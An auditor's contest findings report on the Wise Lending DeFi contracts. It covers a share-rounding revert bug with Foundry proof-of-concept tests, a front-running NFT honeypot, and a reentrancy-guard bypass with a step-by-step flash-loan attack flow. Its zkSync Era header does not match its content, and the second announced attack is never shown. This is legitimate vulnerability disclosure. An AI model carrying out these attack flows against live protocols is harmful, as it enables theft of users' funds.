# Leaderboard
[zkSync Era Results](https://code4rena.com/audits/2024-03-zksync-era-contest#top)<br>

`Rank ? / ?`

# Audited Code Repo
### [Code4rena: zkSync Era](https://github.com/code-423n4/2024-03-zksync)

<br>

# Bugs Filed & Their Status

| # | Bug ID | Name | URL | Adjudged Status |
|--------|--------|------|:------:|-----------------:|
| ? | [H-01](#h-01)  | User's attempt to deposit & withdraw reverts due to the calculation style inside `_calculateShares()` | [?](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27) |  |
| ? | [H-02](#h-02)  | Malicious users can honeypot users by emptying position right before NFT sale | [?](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/35) |  |
| ? | [H-03](#h-03)  | All reentrancy guards can be bypassed since sendingProgress and sendingProgressAaveHub variables inside _sendValue() can be reset | [?](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40) |  |
| ? | [M-01](#m-01)  | Incorrect TWAP implementation can result in assets being frozen prematurely | [?](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/36) |  |


<br>

## **HIGH-SEVERITY BUGS**

---

### <a id="h-01"></a>[H-01]
## **User's attempt to deposit & withdraw reverts due to the calculation style inside `_calculateShares()`**
#### https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L115
<br>

## Summary & Impact
**_Scenario 1 :_**<br>
The following flow of events _(one among many)_ causes a revert:
- Alice calls [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.
- Bob calls [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1.5 ether` (or `0.5 ether` or `1 ether` or `2 ether` or any other value). This reverts unexpectedly.

In case Bob were attempting to make this deposit to rescue his soon-to-become or already bad debt and to avoid liquidation, this revert will delay his attempt which could well be enough for him to be liquidated by any liquidator, causing loss of funds for Bob. Here's a concrete example with numbers:
- Bob calls [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.
- Bob calls [borrowExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L975) to borrow `0.7 ether`. This executes successfully, as expected.
- Bob can see that price is soon going to spiral downwards and cause a bad debt. He plans to deposit some additional collateral to safeguard himself. He calls [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) again to deposit `0.5 ether`. This reverts unexpectedly.
- Prices go down and he is liquidated.
<br>

**_Scenario 2 :_**<br>
A similar revert occurs when the following flow of events occur:
- Alice calls [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `10 ether`. This executes successfully, as expected.
- Bob calls [withdrawExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L636) to withdraw `10 ether` (or `10 ether - 1` or `10 ether - 1000` or `9.5 ether` or `9.1 ether`). This reverts unexpectedly.

Bob is not able to withdraw his entire deposit. If he leaves behind `1 ether` and withdraws only `9 ether`, then he does not face a revert.
<br>
<br>

In both of the above cases, eventually the revert is caused by the validation failure on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) due to the check inside `_validateParameter()`:
```js
  File: contracts/WiseLending.sol

  210:              function _compareSharePrices(
  211:                  address _poolToken,
  212:                  uint256 _lendSharePriceBefore,
  213:                  uint256 _borrowSharePriceBefore
  214:              )
  215:                  private
  216:                  view
  217:              {
  218:                  (
  219:                      uint256 lendSharePriceAfter,
  220:                      uint256 borrowSharePriceAfter
  221:                  ) = _getSharePrice(
  222:                      _poolToken
  223:                  );
  224:
  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(
  226:                      _poolToken
  227:                  );
  228:
  229:                  _validateParameter(
  230:                      _lendSharePriceBefore,
  231:                      lendSharePriceAfter
  232:                  );
  233:
  234: @--->            _validateParameter(
  235: @--->                lendSharePriceAfter,
  236: @--->                currentSharePriceMax
  237:                  );
  238:
  239:                  _validateParameter(
  240:                      _borrowSharePriceBefore,
  241:                      currentSharePriceMax
  242:                  );
  243:
  244:                  _validateParameter(
  245:                      borrowSharePriceAfter,
  246:                      _borrowSharePriceBefore
  247:                  );
  248:              }
```

## Root Cause
- [_compareSharePrices()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219) is called by [_syncPoolAfterCodeExecution()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L319) which is executed due to the [syncPool](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L109) modifier attached to [depositExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L393). 
- Before `_syncPoolAfterCodeExecution()` in the above step is executed, the following internal calls are made by `depositExactAmountETH()`:
  - The [_handleDeposit()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L106) function is called on [L407](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L407) which in-turn calls `calculateLendingShares()` on [L115](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L115)
  - The `calculateLendingShares()` function now calls `_calculateShares()` on [L26](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L26)
  - [_calculateShares() decreases the calculated shares](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) by `1` which is represented by the variable `lendingPoolData[_poolToken].totalDepositShares` inside [_getSharePrice()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L187). 
  - The `_getSharePrice()` functions uses this `lendingPoolData[_poolToken].totalDepositShares` variable in the denominator on [L185-187](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L185-L187) and hence in many cases, returns an increased value _( in this case it evaluates to_ `1000000000000000001` _)_ which is captured in the variable `lendSharePriceAfter` inside [_compareSharePrices()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219).
- Circling back to our first step, this causes the validation to fail on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()` since the `lendSharePriceAfter` is now greater than `currentSharePriceMax` i.e. `1000000000000000001 > 1000000000000000000`. Hence the transaction reverts.

The [reduction by 1 inside _calculateShares()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is done by the protocol in its own favour to safeguard itself. The `lendingPoolData[_poolToken].pseudoTotalPool` however is never modified. This mismatch eventually reaches a significant divergence, and is the root cause of these reverts. See 
- the last comment inside the `Proof of Concept-2 (Withdraw scenario)` section later in the report.
- `Option1` inside the `Recommended Mitigation Steps` section later in the report.
<br>
<br>

<details><summary>Click to visualize better through relevant code snippets</summary>

```js
  File: contracts/WiseLending.sol

  97:               modifier syncPool(
  98:                   address _poolToken
  99:               ) {
  100:                  (
  101:                      uint256 lendSharePrice,
  102:                      uint256 borrowSharePrice
  103:                  ) = _syncPoolBeforeCodeExecution(
  104:                      _poolToken
  105:                  );
  106:          
  107:                  _;
  108:          
  109: @--->            _syncPoolAfterCodeExecution(
  110:                      _poolToken,
  111:                      lendSharePrice,
  112:                      borrowSharePrice
  113:                  );
  114:              }
```

```js
  File: contracts/WiseLending.sol

  308:              function _syncPoolAfterCodeExecution(
  309:                  address _poolToken,
  310:                  uint256 _lendSharePriceBefore,
  311:                  uint256 _borrowSharePriceBefore
  312:              )
  313:                  private
  314:              {
  315:                  _newBorrowRate(
  316:                      _poolToken
  317:                  );
  318:          
  319: @--->            _compareSharePrices(
  320:                      _poolToken,
  321:                      _lendSharePriceBefore,
  322:                      _borrowSharePriceBefore
  323:                  );
  324:              }
```

```js
  File: contracts/WiseLending.sol

  388:              function depositExactAmountETH(
  389:                  uint256 _nftId
  390:              )
  391:                  external
  392:                  payable
  393:                  syncPool(WETH_ADDRESS)
  394:                  returns (uint256)
  395:              {
  396: @--->            return _depositExactAmountETH(
  397:                      _nftId
  398:                  );
  399:              }
  400:          
  401:              function _depositExactAmountETH(
  402:                  uint256 _nftId
  403:              )
  404:                  private
  405:                  returns (uint256)
  406:              {
  407: @--->            uint256 shareAmount = _handleDeposit(
  408:                      msg.sender,
  409:                      _nftId,
  410:                      WETH_ADDRESS,
  411:                      msg.value
  412:                  );
  413:          
  414:                  _wrapETH(
  415:                      msg.value
  416:                  );
  417:          
  418:                  return shareAmount;
  419:              }
```

```js
  File: contracts/WiseCore.sol

  106:              function _handleDeposit(
  107:                  address _caller,
  108:                  uint256 _nftId,
  109:                  address _poolToken,
  110:                  uint256 _amount
  111:              )
  112:                  internal
  113:                  returns (uint256)
  114:              {
  115: @--->            uint256 shareAmount = calculateLendingShares(
  116:                      {
  117:                          _poolToken: _poolToken,
  118:                          _amount: _amount,
  119: @--->                    _maxSharePrice: false
  120:                      }
  121:                  );
  122:          
```

```js
  File: contracts/MainHelper.sol

  17:               function calculateLendingShares(
  18:                   address _poolToken,
  19:                   uint256 _amount,
  20:                   bool _maxSharePrice
  21:               )
  22:                   public
  23:                   view
  24:                   returns (uint256)
  25:               {
  26:  @--->            return _calculateShares(
  27:                       lendingPoolData[_poolToken].totalDepositShares * _amount,
  28:                       lendingPoolData[_poolToken].pseudoTotalPool,
  29:                       _maxSharePrice
  30:                   );
  31:               }
  32:           
  33:               function _calculateShares(
  34:                   uint256 _product,
  35:                   uint256 _pseudo,
  36:                   bool _maxSharePrice
  37:               )
  38:                   private
  39:                   pure
  40:                   returns (uint256)
  41:               {
  42:                   return _maxSharePrice == true
  43:                       ? _product / _pseudo + 1
  44:  @--->                : _product / _pseudo - 1;
  45:               }
```

```js
  File: contracts/WiseLending.sol

  210:              function _compareSharePrices(
  211:                  address _poolToken,
  212:                  uint256 _lendSharePriceBefore,
  213:                  uint256 _borrowSharePriceBefore
  214:              )
  215:                  private
  216:                  view
  217:              {
  218:                  (
  219: @--->                uint256 lendSharePriceAfter,
  220:                      uint256 borrowSharePriceAfter
  221: @--->            ) = _getSharePrice(
  222:                      _poolToken
  223:                  );
  224:          
  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(
  226:                      _poolToken
  227:                  );
  228:          
  229:                  _validateParameter(
  230:                      _lendSharePriceBefore,
  231:                      lendSharePriceAfter
  232:                  );
  233:          
  234:                  _validateParameter(
  235: @--->                lendSharePriceAfter,
  236:                      currentSharePriceMax
  237:                  );
  238:          
  239:                  _validateParameter(
  240:                      _borrowSharePriceBefore,
  241:                      currentSharePriceMax
  242:                  );
  243:          
  244:                  _validateParameter(
  245:                      borrowSharePriceAfter,
  246:                      _borrowSharePriceBefore
  247:                  );
  248:              }
```

```js
  File: contracts/WiseLending.sol

  165:              function _getSharePrice(
  166:                  address _poolToken
  167:              )
  168:                  private
  169:                  view
  170:                  returns (
  171:                      uint256,
  172:                      uint256
  173:                  )
  174:              {
  175:                  uint256 borrowSharePrice = borrowPoolData[_poolToken].pseudoTotalBorrowAmount
  176:                      * PRECISION_FACTOR_E18
  177:                      / borrowPoolData[_poolToken].totalBorrowShares;
  178:          
  179:                  _validateParameter(
  180:                      MIN_BORROW_SHARE_PRICE,
  181:                      borrowSharePrice
  182:                  );
  183:          
  184:                  return (
  185:                      lendingPoolData[_poolToken].pseudoTotalPool
  186:                          * PRECISION_FACTOR_E18
  187: @--->                    / lendingPoolData[_poolToken].totalDepositShares,
  188:                      borrowSharePrice
  189:                  );
  190:              }
```

</details>

<br>
<br>

## Proof of Concept-1 (Deposit scenario)
Add the following tests inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_DepositsRevert` to see the tests fail. 
```js
    function test_t0x1c_DepositsRevert_Simple() 
        public
    {
        uint256 nftId;
        nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`

        address bob = makeAddr("Bob");
        vm.deal(bob, 10 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId_bob = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1.5 ether}(nftId_bob); // @audit : REVERTS incorrectly (reverts for numerous values like `0.5 ether`, `1 ether`, `2 ether`, etc.)
    }

    function test_t0x1c_DepositsRevert_With_Borrow() 
        public
    {
        address bob = makeAddr("Bob");
        vm.deal(bob, 10 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`

        LENDING_INSTANCE.borrowExactAmountETH(nftId, 0.7 ether);

        LENDING_INSTANCE.depositExactAmountETH{value: 0.5 ether}(nftId); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself
    }
```

If you want to check with values which make the test pass, change the following line in both the tests and run again:
```diff
-     LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`
+     LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`
```

There are numerous combinations which will cause such a "revert" scenario to occur. Just to provide another example:
- Four initial deposits are made in either _Style1_ or _Style2_:
  - Style1:
    - Alice makes 4 deposits of `2.5 ether` each. Total deposits made by Alice = 4 * 2.5 ether = 10 ether.
  - Style2:
    - Alice makes a deposit of `2.5 ether`
    - Bob makes a deposit of `2.5 ether`
    - Carol makes a deposit of `2.5 ether`
    - Dan makes a deposit of `2.5 ether`. Total deposits made by 4 users = 4 * 2.5 ether = 10 ether.

- Now, Emily tries to make a deposit of `2.5 ether`. **_This reverts._**

## Proof of Concept-2 (Withdraw scenario)
Add the following test inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_WithdrawRevert` to see the test fail. 
```js
    function test_t0x1c_WithdrawRevert() 
        public
    {
        address bob = makeAddr("Bob");
        vm.deal(bob, 100 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 10 ether}(nftId); 
        
        LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
    }
```

If you want to check with values which make the test pass, change the following line of the test case like shown below and run again:
```diff
-     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
+     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
```

This failure happened because the moment `lendingPoolData[_poolToken].pseudoTotalPool` and `lendingPoolData[_poolToken].totalDepositShares` go below `1 ether`, their divergence is significant enough to result in `lendSharePrice` being calculated as greater than `1000000000000000000` or `1 ether`:
```js
  lendSharePrice = lendingPoolData[_poolToken].pseudoTotalPool * 1e18 / lendingPoolData[_poolToken].totalDepositShares
```
which in this case evaluates to `1000000000000000001`. This brings us back to our root cause of failure. Due to the divergence, `lendSharePrice` of `1000000000000000001` has become greater than `currentSharePriceMax` of `1000000000000000000` and fails the validation on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()`.

## Severity
Likelihood: `High` (possible for a huge number of value combinations, as shown above)<br>
Impact: `High / Med` (If user is trying to save his collateral, this is high impact. Otherwise he can try later with modified values making it a medium impact.)
<br>

Hence severity: `High`

## Tools Used
Foundry

## Recommended Mitigation Steps
Since the [reduction by 1 inside _calculateShares()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is being done to round-down in favour of the protocol, removing that without a deeper analysis could prove to be risky as it may open up other attack vectors. Still, two points come to mind which can be explored -
- **Option1:** Reducing `lendingPoolData[_poolToken].pseudoTotalPool` too would keep it in sync with `lendingPoolData[_poolToken].totalDepositShares` and hence will avoid the current issue.

- **Option2:** Not reducing it by 1 seems to solve the immediate problem at hand _(needs further impact analysis)_:
```diff
  File: contracts/MainHelper.sol

  33:               function _calculateShares(
  34:                   uint256 _product,
  35:                   uint256 _pseudo,
  36:                   bool _maxSharePrice
  37:               )
  38:                   private
  39:                   pure
  40:                   returns (uint256)
  41:               {
  42:                   return _maxSharePrice == true
  43:                       ? _product / _pseudo + 1
- 44:                       : _product / _pseudo - 1;
+ 44:                       : _product / _pseudo;
  45:               }
```

---

### <a id="h-02"></a>[H-02]
## **Malicious users can honeypot users by emptying position right before NFT sale**
#### https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L38-L40
<br>

## Summary & Impact
Right before the sale of a position NFT on the secondary market, a malicious owner can front-run & can empty/modify his position by removing collateral or adding borrowed amount. <br>
The purchaser thus becomes a victim of this honeypot attack and is left with a worthless NFT while the malicious user receives the listed price in addition to his assets.

## Vulnerability Details
The [natspec comment](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L38-L40) mentions:
```js
  File: contracts/WiseLending.sol

  38:            * - Users save their collaterals and borrows inside a position NFT, making it possible
  39:            *   to trade their whole positions or use them in second-layer contracts
  40:            *   (e.g., spot trading with PTP NFT trading platforms).
  41:            */
```

A position NFT is minted for users when they call `uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition();` which is then used to deposit, borrow, payback, withdraw, etc. A malicious user can do the following:
- Create a new position and receive a position NFT with id as `nftId` by calling `mintPosition()`.
- Deposit some ETH by calling `depositExactAmountETH{value: 100 ether}(nftId)`.
- List the NFT on some PTP NFT trading platform for spot trading.
- The position looks healthy and attracts a buyer who agrees to pay X amount say, 95 ether to purchase the NFT.
- The owner monitors the mempool and front-runs buyer's transaction by calling `withdrawExactAmountETH(nftId, 100 ether)` and withdraws all ETH. He consequently receives the buyer's 95 ether too.
- The buyer is left with an empty NFT.

## Tools Used
Manual review

## Context & References to Similar Past Bugs with High Severity
- [On Sherlock](https://github.com/sherlock-audit/2023-04-footium-judging/issues/291)
- [On CodeHawks](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/445)
- [Another on CodeHawks](https://www.codehawks.com/submissions/clql6lvyu0001mnje1xpqcuvl/719)

## Recommended Mitigation Steps
The protocol should consider implementing a timelock function which prohibits the owner from making any position modifications for a stipulated period of time. This function would be callable by only the owner. A buyer can then demand to see that the NFT is under timelock and makes the purchase before the timelock expires.

---

### <a id="h-03"></a>[H-03]
## **All reentrancy guards can be bypassed since sendingProgress and sendingProgressAaveHub variables inside _sendValue() can be reset**
#### https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/TransferHub/SendValueHelper.sol#L31
#### https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L212
<br>

## Summary
By sending `0 wei` to `WiseLending.sol` or `AaveHub.sol`, all reentrancy modifiers can be bypassed.

## Description
There are two copies of the `_sendValue()` function - one inside [SendValueHelper.sol#L31](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/TransferHub/SendValueHelper.sol#L31) and another inside [AaveHelper.sol#L212](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L212) which set either the `sendingProgress` or the `sendingProgressAaveHub` variable to `true` or `false`. These values of `sendingProgress / sendingProgressAaveHub` are used by all the non-reentrancy modifiers like:
- [nonReentrant()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L9-L12) which intenally checks on [L38 and L42](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L38-L42)
- [updatePools()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L9) which makes these checks inside [PendlePowerFarmMathLogic::_checkReentrancy()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L43-L47) 
- [syncPool()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L103) which internally calls [_syncPoolBeforeCodeExecution()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L284) which in-turn makes these checks inside [WiseLowLevelHelper::_checkReentrancy()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLowLevelHelper.sol#L354-L359) 

These values of `sendingProgress / sendingProgressAaveHub` can be reset to `false` during a ETH transfer transaction by sending `0 wei` (or any amount) to `WiseLending.sol` and `AaveHub.sol` due to incomplete checks implemented by the protocol. This makes all the re-entrancy guarding modifiers used by the protocol ineffective.
<br>
<br>

<details><summary>Toggle to view relevant code snippets</summary>

```js
  File: contracts/TransferHub/SendValueHelper.sol

  12:               function _sendValue(
  13:                   address _recipient,
  14:                   uint256 _amount
  15:               )
  16:                   internal
  17:               {
  18:                   if (address(this).balance < _amount) {
  19:                       revert AmountTooSmall();
  20:                   }
  21:           
  22:  @--->            sendingProgress = true;
  23:           
  24:                   (
  25:                       bool success
  26:                       ,
  27:                   ) = payable(_recipient).call{
  28:                       value: _amount
  29:                   }("");
  30:           
  31:  @--->            sendingProgress = false;
  32:           
  33:                   if (success == false) {
  34:                       revert SendValueFailed();
  35:                   }
  36:               }
```

```js
  File: contracts/WrapperHub/AaveHelper.sol

  196:              function _sendValue(
  197:                  address _recipient,
  198:                  uint256 _amount
  199:              )
  200:                  internal
  201:              {
  202:                  if (address(this).balance < _amount) {
  203:                      revert InvalidValue();
  204:                  }
  205:          
  206: @--->            sendingProgressAaveHub = true;
  207:          
  208:                  (bool success, ) = payable(_recipient).call{
  209:                      value: _amount
  210:                  }("");
  211:          
  212: @--->            sendingProgressAaveHub = false;
  213:          
  214:                  if (success == false) {
  215:                      revert FailedInnerCall();
  216:                  }
  217:              }
```

```js
  File: contracts/WrapperHub/AaveHelper.sol

  9:                modifier nonReentrant() {
  10:  @--->            _nonReentrantCheck();
  11:                   _;
  12:               }

                .....
                .....
  
  34:               function _nonReentrantCheck()
  35:                   internal
  36:                   view
  37:               {
  38:  @--->            if (sendingProgressAaveHub == true) {
  39:                       revert InvalidAction();
  40:                   }
  41:           
  42:  @--->            if (WISE_LENDING.sendingProgress() == true) {
  43:                       revert InvalidAction();
  44:                   }
  45:               }
```

```js
  File: contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol

  9:                modifier updatePools() {
  10:  @--->            _checkReentrancy();
  11:                   _updatePools();
  12:                   _;
  13:               }

                .....
                .....

  35:               function _checkReentrancy()
  36:                   private
  37:                   view
  38:               {
  39:                   if (sendingProgress == true) {
  40:                       revert AccessDenied();
  41:                   }
  42:           
  43:  @--->            if (WISE_LENDING.sendingProgress() == true) {
  44:                       revert AccessDenied();
  45:                   }
  46:           
  47:  @--->            if (AAVE_HUB.sendingProgressAaveHub() == true) {
  48:                       revert AccessDenied();
  49:                   }
  50:               }
```

```js
  File: contracts/WiseLending.sol

  97:               modifier syncPool(
  98:                   address _poolToken
  99:               ) {
  100:                  (
  101:                      uint256 lendSharePrice,
  102:                      uint256 borrowSharePrice
  103: @--->            ) = _syncPoolBeforeCodeExecution(
  104:                      _poolToken
  105:                  );
  106:          
  107:                  _;
  108:          
  109:                  _syncPoolAfterCodeExecution(
  110:                      _poolToken,
  111:                      lendSharePrice,
  112:                      borrowSharePrice
  113:                  );
  114:              }
  
                .....
                .....

  275:              function _syncPoolBeforeCodeExecution(
  276:                  address _poolToken
  277:              )
  278:                  private
  279:                  returns (
  280:                      uint256 lendSharePrice,
  281:                      uint256 borrowSharePrice
  282:                  )
  283:              {
  284: @--->            _checkReentrancy();
  285:          
  286:                  _preparePool(
  287:                      _poolToken
  288:                  );
  289:          
  290:                  if (_aboveThreshold(_poolToken) == true) {
  291:                      _scalingAlgorithm(
  292:                          _poolToken
  293:                      );
  294:                  }
  295:          
  296:                  (
  297:                      lendSharePrice,
  298:                      borrowSharePrice
  299:                  ) = _getSharePrice(
  300:                      _poolToken
  301:                  );
  302:              }
```
</details>

<br>

## Root Cause & Attack Flows
In order to achieve reentrancy, an attacker would want to call `_sendValue()` again from inside an ongoing `_sendValue()` (i.e. from the attacker's `receive()` function, which is invoked either on [L27](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/TransferHub/SendValueHelper.sol#L27) or [L208](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L208)), since this sets `sendingProgress / sendingProgressAaveHub` to `false` and any subsequent calls are not blocked by the protocol. This nested call can be achieved by invoking the protocol's unprotected `receive()` functions which themselves internally call `_sendValue()`. Refer the two `receive()` functions inside:
- [WiseLending.sol#L57](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L57) and 
- [AaveHub.sol#L91](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L91)

They internally call `_sendValue()` which sets `sendingProgress / sendingProgressAaveHub` to `false` at the end. **_Thus, sending even_** `0 wei` **_to these contracts will help an attacker bypass reentrancy checks_**. 
<br>

This can be used to carry out the following 2 types of attacks -

## Attack 1 (flash-deposit):
- As [mentioned by the protocol team under the 'Known issues' section](https://code4rena.com/audits/2024-02-wise-lending#top:~:text=(Part%201)%20One%20entity%20could%20force%20the%20current%20stepping%20direction%20by%20using%20flash%20loans) on the contest page:
> (Part 1) One entity could force the current stepping direction by using flash loans and dumping a huge amount into the pool with a transaction triggering the algorithm (after three hours). In the same transaction, the entity could withdraw the amount and finish paying back the flash loan. The entity could repeat this every three hours, manipulating the stepping direction. Now, we changed it in a way that the algorithm runs before the user adds or withdraws tokens, which influences the shares.

The above is not true because of the following two observations:
  - Flash loans can still be used for the attack since reentrancy modifiers can be bypassed.
  - The statement made by the protocol that _"the algorithm runs before the user adds or withdraws token"_ is incorrect. The way solidity modifiers operate, the current order of code execution actually is:
    - Step 1: User calls `WiseLending.sol::withdrawExactAmountETH()`. It has two modifiers attached to it - `syncPool` and `healthStateCheck`.
    - Step 2: modifier `syncPool` is triggered which looks like the following - 
      - `_syncPoolBeforeCodeExecution` followed by "`_`" _( which implies function's code substitution )_ followed by `_syncPoolAfterCodeExecution`.
      - But `healthStateCheck` needs to be executed too and hence the actual order of execution becomes: 
        - `_syncPoolBeforeCodeExecution` followed by 
        - "`_`" _( which implies function's code substitution )_ followed by 
        - `healthStateCheck` followed by 
        - `_syncPoolAfterCodeExecution`.
    ```js
    File: contracts/WiseLending.sol

    97:               modifier syncPool(
    98:                   address _poolToken
    99:               ) {
    100:                  (
    101:                      uint256 lendSharePrice,
    102:                      uint256 borrowSharePrice
    103: @--->            ) = _syncPoolBeforeCodeExecution(
    104:                      _poolToken
    105:                  );
    106:          
    107: @--->            _;
    108:          
    109: @--->            _syncPoolAfterCodeExecution(
    110:                      _poolToken,
    111:                      lendSharePrice,
    112:                      borrowSharePrice
    113:                  );
    114:              }
    ```
    ```js
    File: contracts/WiseLending.sol

    67:               modifier healthStateCheck(
    68:                   uint256 _nftId
    69:               ) {
    70:  @--->            _;
    71:           
    72:                   _healthStateCheck(
    73:                       _nftId
    74:                   );
    75:               }
    ```
    - Step 3: The LASA algorithm is run inside the function `_newBorrowRate()` which is called inside [_syncPoolAfterCodeExecution](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L315). **Hence, it is actually run _after_ the deposit/withdraw/borrow/payback has been made by the user, _not before_**.

This makes the following attack vector possible:
- Initially, some deposits and borrows are present in the system, made by various users. The `value utilization` and `borrow rate` are at some level.
- Attacker contract (named `Killer`) calls [depositExactAmountETH{value: 100 ether}](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `100 ether`.
- `Killer` then calls [withdrawExactAmountETH(nftId, 1 ether)](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L636). This internally calls [_sendValue()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L663) and it's expected that the [reentrancy guards which are now in play](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/TransferHub/SendValueHelper.sol#L22), will protect the protocol from any reentrant calls while this transaction is in progress.
- From inside Killer's `receive()` function ( which got triggered as a result of the above call to `withdrawExactAmountETH()` ), send `0 wei` to `WiseLending.sol`.
- This triggers the [receive() function inside WiseLending.sol, which again calls _sendValue() at L57](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L57) which subsequently sets `sendingProgress` to `false`. Reentrancy guards will let us through now.
- `Killer` continues inside his `receive()` function and procures a flash-loan of `1,000,000 ether` which he then deposits via `depositExactAmountETH{value: 1_000_000 ether}`. This "flash-deposit" lowers the `value utilization` and hence the `borrow rate`.
- `Killer` now makes a call to any function he wants, for example [borrowExactAmountETH()](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L975) which has a reentrancy guard (or `paybackExactAmountETH` or some other function). He is not stopped.
- Calling `borrowExactAmountETH()` in the above step will bring the control back to `Killer`'s receive() function where he can call `withdrawExactAmountETH(nftId, 1_000_000 ether)`. This call will result in another nested call to `Killer`'s receive() function.
- `Killer` now returns the flash loan.

